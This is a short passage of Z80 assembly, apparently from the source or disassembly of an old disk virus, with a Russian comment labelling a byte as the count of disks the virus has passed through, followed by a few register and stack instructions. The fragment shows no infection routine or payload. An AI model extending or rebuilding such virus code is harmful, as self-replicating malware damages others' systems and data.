db:	0Ch    ;кол-во дисков через которые прошел вирус

	DEC	HL
	PUSH	HL
	LD	HL,(LF349)
	PUSH	HL
	INC	HL
	LD	E,(HL)
	INC	HL
	LD	D,(HL)
	LD	HL,L2AE5
